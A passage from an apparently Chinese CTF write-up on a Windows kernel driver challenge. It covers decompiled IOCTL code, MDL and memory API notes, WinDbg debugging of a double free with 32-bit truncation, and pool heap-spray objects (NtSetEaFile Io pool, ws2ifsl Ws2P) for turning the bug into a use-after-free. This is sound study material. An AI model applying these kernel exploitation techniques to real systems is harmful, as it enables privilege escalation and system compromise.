class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = ContiguousMemory;</span><br><span class="line">      <span class="keyword">if</span> ( ContiguousMemory )</span><br><span class="line">      &#123;</span><br><span class="line">        Mdl = <span class="built_in">IoAllocateMdl</span>(ContiguousMemory, _usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">        _pMdl = Mdl;</span><br><span class="line">        <span class="keyword">if</span> ( Mdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(Mdl);</span><br><span class="line">          pStartAddr2 = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pStartAddr2 = pStartAddr2;</span><br><span class="line">          <span class="keyword">if</span> ( pStartAddr2 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">4</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">3</span>) = pStartAddr2;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">5</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(pStartAddr2, <span class="number">0xFF</span>, _usSize);</span><br><span class="line">            *(_DWORD *)buffer = _usSize;</span><br><span class="line">            *(_QWORD *)(buffer + <span class="number">4</span>) = _pStartAddr2;</span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">12</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402408</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)DeviceExtension )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl || !*((_QWORD *)DeviceExtension + <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(*(PVOID *)DeviceExtension, __pMdl);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">2</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C40240C</span>:</span><br><span class="line">      __pStartAddr2 = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pStartAddr2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl2 = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl2 || !*((_QWORD *)DeviceExtension + <span class="number">4</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(__pStartAddr2, __pMdl2);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">5</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">4</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">MmFreeContiguousMemory</span>(__pVirtualAddress);</span><br><span class="line">LABEL_17:</span><br><span class="line">      irp-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0xC0000010</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  irp-&gt;IoStatus.Status = v3;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(irp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MDL"><a href="#MDL" class="headerlink" title="MDL"></a>MDL</h3><p>memory descriptor list</p>
<p>跨一系列连续虚拟内存地址的 I&#x2F;O 缓冲区可以分布在多个物理页中，并且这些页面可以是不连续的。 操作系统使用 <em>内存描述符列表</em> (MDL) 来描述虚拟内存缓冲区的物理页面布局。</p>
<ul>
<li>StartVa：page开始的地址</li>
<li>ByteOffset：在page内的偏移</li>
<li>ByteCount: 大小</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MDL</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span>      *Next;</span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EPROCESS</span> *Process;</span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong>MmAllocateContiguousMemory</strong>：分配一系列连续的NonPagedPool内存，并将其映射到系统地址空间，分配的内存未初始化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回已分配内存的基虚拟地址。</span></span><br><span class="line"><span class="function">PVOID <span class="title">MmAllocateContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T           NumberOfBytes,           <span class="comment">// 要分配的连续内存块的大小（以字节为单位）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PHYSICAL_ADDRESS HighestAcceptableAddress <span class="comment">// 调用方可以使用的最高有效物理地址。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>释放由 <strong>MmAllocateContiguousMemoryXxx</strong> 分配的一系列物理连续内存。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmFreeContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>给定缓冲区的起始地址和长度， <strong>IoAllocateMdl</strong> 分配内存描述符列表 (MDL) 足以映射缓冲区（NonPagedPool）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回指向 MDL 的指针</span></span><br><span class="line"><span class="function">PMDL <span class="title">IoAllocateMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,   <span class="comment">// 指向 MDL 要描述的缓冲区的基虚拟地址的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  Length,           <span class="comment">// 指定 MDL 要描述的缓冲区的长度（以字节为单位）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                SecondaryBuffer,  <span class="comment">// 指示缓冲区是主缓冲区还是辅助缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                ChargeQuota,      <span class="comment">// 预留给系统使用。 驱动程序必须将此参数设置为 **FALSE**。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] PIRP                   Irp               <span class="comment">// 指向要与 MDL 关联的 IRP 的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ntoskrnl.exe</span></span><br><span class="line">result = (PMDL)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, size, <span class="string">&#x27; ldM&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>创建一个MDL结构体，而这个结构体描述给出的VurtualAddress</p>
<p><strong>IoFreeMdl</strong> 释放调用方分配的内存描述符列表 (MDL) 。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoFreeMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMDL Mdl</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmBuildMdlForNonPagedPool</strong> 接收指定非分页虚拟内存缓冲区的 MDL，并更新它以描述基础物理页。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmBuildMdlForNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] PMDL MemoryDescriptorList    <span class="comment">// 指向 MDL 的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmMapLockedPagesSpecifyCache</strong> 将 MDL 描述的物理页面映射到虚拟地址，并使调用方能够指定用于创建映射的缓存属性。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MmMapLockedPagesSpecifyCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PMDL                                                                          MemoryDescriptorList,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictType(KPROCESSOR_MODE / <span class="keyword">enum</span> _MODE,__drv_typeConst)KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                                                                         RequestedAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         BugCheckOnFailure,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         Priority</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>AccessMode：<strong>KernelMode</strong> 或 <strong>UserMode</strong>。 </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_MODE</span> &#123; </span><br><span class="line">    KernelMode, </span><br><span class="line">    UserMode, </span><br><span class="line">    MaximumMode </span><br><span class="line">&#125; MODE; </span><br></pre></td></tr></table></figure>

<p><code>MmNonCached</code>：请求的内存不应由处理器缓存。</p>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>分配了两个NonPagedPool内存，在Free后并没有把相关位置置为0，可以多次free。</p>
<p>下断点调试</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m s*</span><br><span class="line">Browse full <span class="keyword">module</span> list</span><br><span class="line"><span class="comment">// 查看start内存，PE文件格式</span></span><br><span class="line">start             end                 <span class="keyword">module</span> name</span><br><span class="line">fffff805`<span class="number">1b</span>010000 fffff805`<span class="number">1b</span>019000   <span class="built_in">sioctl</span>     (no symbols)</span><br><span class="line"><span class="comment">// IDA: 140005020 </span></span><br><span class="line"><span class="comment">// 偏移：0x5020 </span></span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 sioctl+<span class="number">0x5020</span>  <span class="comment">// ioctl</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br></pre></td></tr></table></figure>

<p><code>0x9C402400</code> IoAllocateMdl，根据返回值确定一下MDL的大小</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; </span><br><span class="line">sioctl+<span class="number">0x521e</span>:</span><br><span class="line">fffff80a`<span class="number">9852521</span>e ff150cceffff    call    qword ptr [sioctl+<span class="number">0x2030</span> (fffff80a`<span class="number">98522030</span>)]</span><br><span class="line"></span><br><span class="line">*ffff880ab958ed20 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Mdl</span><br></pre></td></tr></table></figure>

<p>但是程序走到Memset会报错，因为地址不对，可以从汇编看出来使用32位地址截断</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">000000014000526F</span>                 mov     ecx, r12d       ; Dst</span><br><span class="line">PAGE:<span class="number">0000000140005272</span>                 mov     edx, <span class="number">0F</span>Fh       ; Val</span><br><span class="line">PAGE:<span class="number">0000000140005277</span>                 mov     r8d, r15d       ; Size</span><br></pre></td></tr></table></figure>

<h3 id="Io-NpFr-Ws2P"><a href="#Io-NpFr-Ws2P" class="headerlink" title="Io&#x2F;NpFr&#x2F;Ws2P"></a>Io&#x2F;NpFr&#x2F;Ws2P</h3><p>官方WP：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14190">第二届AliyunCTF官方writeup</a> – 因为这里设计是给32位程序使用的回调，64位程序的用户态地址在发生integer truncation后往往是非法地址，预期是通过一个32位的程序完成利用</p>
<p>在VS里选择x86生成，<code>0x9C402400</code> 确实没有崩溃。</p>
<ul>
<li>这里还必须得使用，因为如果 <code>MmAllocateContiguousMemory</code> 分配的内存被连续释放会蓝屏</li>
</ul>
<p>思路是 DF 转化为 指定结构体的 UAF。</p>
<p>这里作者介绍了两种堆喷的对象</p>
<ul>
<li>IopVerifierExAllocatePoolWithQuota的调用中会申请类型为NonPagedPoolNx的Pool</li>
<li>经典的NpFr</li>
</ul>
<h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p>这个<strong>结构大小可以控制，内容可以控制</strong>，品相相当不错</p>
<p>IopVerifierExAllocatePoolWithQuota：其上层调用如NtSetInformationFile、NtSetEaFile等函数都可以实现控制申请pool的大小，并写入内容。但是却存在一个问题，就是这类poolTag为IO的池，都会在IO结束时被释放，虽然被释放了，但是当前内核池的内容并没有立即被占用，内容还在。</p>
<p>相关内容：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/255916">etw 事件管理器内核漏洞利用</a></p>
<p>ntkrnlImp.exe（ntoskrnl.exe）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID __fastcall <span class="title">IopVerifierExAllocatePoolWithQuota</span><span class="params">(__int64 a1, SIZE_T a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !ViVerifierEnabled</span><br><span class="line">    || (VfRuleClasses &amp; <span class="number">0xFFAFFFFF</span>) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x200000000</span>i64) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x400000000</span>i64) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithQuotaTag</span>(NonPagedPoolNx, a2, <span class="string">&#x27;  oI&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">ExAllocatePoolWithTagPriority</span>(</span><br><span class="line">             NonPagedPoolNx,</span><br><span class="line">             a2,</span><br><span class="line">             <span class="number">0x20206F49</span>u,</span><br><span class="line">             (EX_POOL_PRIORITY)((MmVerifierData &amp; <span class="number">0x10</span> | <span class="number">0x40</span>u) &gt;&gt; <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="built_in">RtlRaiseStatus</span>(<span class="number">3221225626</span>i64);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>交叉引用：NtSetEaFile，该函数内部检测DEVICE_OBJECT的Flags是否包含4（DO_BUFFERED_IO），因此第一个参数的句柄给的是<code>PEAuth</code>的文件句柄，EVICE_OBJECT的Flags为0x44。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI </span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN HANDLE               FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  OUT PIO_STATUS_BLOCK    IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN PVOID                EaBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN ULONG                EaBufferSize </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets extended-attribute (EA) values for a file.</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">NtSetEaFile</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, ULONG a4)</span></span></span><br><span class="line"><span class="function"><span class="comment">// ...</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">v4 </span>= (<span class="type">void</span> *)a3;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// v12 是经过 a1(FileHandler) 寻找到的Object</span></span><br><span class="line">DeviceObject = <span class="built_in">IoGetRelatedDeviceObject</span>(v12);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Flags = DeviceObject-&gt;Flags;</span><br><span class="line"><span class="keyword">if</span> ( (Flags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	ErrorOffset = <span class="number">0</span>;</span><br><span class="line">	v26 = a4;</span><br><span class="line">	<span class="keyword">if</span> ( a4 )</span><br><span class="line">	&#123;</span><br><span class="line">	  v35 = <span class="number">0</span>;</span><br><span class="line">	  PoolWithQuota = (<span class="keyword">struct</span> _FILE_FULL_EA_INFORMATION *)<span class="built_in">IopVerifierExAllocatePoolWithQuota</span>(<span class="number">0</span>i64, a4);</span><br><span class="line">	  Irp-&gt;AssociatedIrp.MasterIrp = (_IRP *)PoolWithQuota;</span><br><span class="line">	  <span class="built_in">memmove</span>(PoolWithQuota, v4, a4);</span><br><span class="line">	  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="Ws2P"><a href="#Ws2P" class="headerlink" title="Ws2P"></a>Ws2P</h4><p>另外一个对象，作者给出 <code>ws2ifsl</code>，可以看如下的文章了解一下</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196893">Windows内核ws2ifsl.sys中UAF漏洞分析</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-257435.htm">CVE-2019-1215分析笔记</a></li>
</ul>
<p>当调用NtCreateFile时，文件名设置为<code>\Device\WS2IFSL\</code>，将调用DispatchCreate函数，函数将根据文件名中的<code>_FILE_FULL_EA_INFORMATION.EaName</code>字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。</p>
<p>CreateProcessFile函数都创建内部对象，称为<code>procData</code>。创建后，这些对象将保存在文件对象的<code>_FILE_OBJECT.FsContext</code>中</p>
<p>ws2ifsl.sys!DispatchCreate</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCreate</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 MasterIrp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ProcessFile; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  MasterIrp = (__int64)a2-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  <span class="keyword">if</span> ( !MasterIrp )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(MasterIrp + <span class="number">5</span>) != <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsSct&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp_0</span>((<span class="type">const</span> <span class="type">char</span> *)(MasterIrp + <span class="number">8</span>), <span class="string">&quot;NifsPvd&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessFile = <span class="built_in">CreateProcessFile</span>((__int64)CurrentStackLocation-&gt;FileObject, a2-&gt;RequestorMode, MasterIrp);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v7 = <span class="number">-1073741811</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v5) = a2-&gt;RequestorMode;</span><br><span class="line">  ProcessFile = <span class="built_in">CreateSocketFile</span>(CurrentStackLocation-&gt;FileObject, v5, MasterIrp);</span><br><span class="line">LABEL_7:</span><br><span class="line">  v7 = ProcessFile;</span><br><span class="line">LABEL_9:</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  a2-&gt;IoStatus.Status = v7;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ws2ifsl!CreateProcessFile，一个tag位Ws2P的池 ProcData</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CreateProcessFile</span><span class="params">(PFILE_OBJECT pFileObj, KPROCESSOR_MODE Mode, <span class="keyword">struct</span> _IRP *Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  Blink = Irp-&gt;ThreadListEntry.Blink;</span><br><span class="line">  Flink = Irp-&gt;ThreadListEntry.Flink;</span><br><span class="line">  MasterIrp = Irp-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  Flags = *(<span class="type">void</span> **)&amp;Irp-&gt;Flags;</span><br><span class="line">LABEL_7:</span><br><span class="line">  Object = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">ObReferenceObjectByHandle</span>(Flags, <span class="number">0x10</span>u, (POBJECT_TYPE)PsThreadType, Mode, &amp;Object, <span class="number">0</span>i64);</span><br><span class="line">  _object = Object;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="built_in">IoThreadToProcess</span>((PETHREAD)Object);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="built_in">IoGetCurrentProcess</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      Pool2 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x61</span>i64, <span class="number">0x110</span>i64, <span class="string">&#x27;P2sW&#x27;</span>);</span><br><span class="line">      _Pool2 = Pool2;</span><br><span class="line">      <span class="keyword">if</span> ( Pool2 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)Pool2 = <span class="string">&#x27;corP&#x27;</span>;</span><br><span class="line">        *(_QWORD *)(Pool2 + <span class="number">8</span>) = <span class="built_in">PsGetCurrentProcessId</span>();</span><br><span class="line">        *(_DWORD *)(_Pool2 + <span class="number">0x100</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_QWORD *)(_Pool2 + <span class="number">0x108</span>) = <span class="number">1</span>i64;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(_Mode) = Mode;</span><br><span class="line">        v12 = <span class="built_in">InitializeRequestQueue</span>(_Pool2, (<span class="type">int</span>)_object, _Mode, (<span class="type">int</span>)MasterIrp, 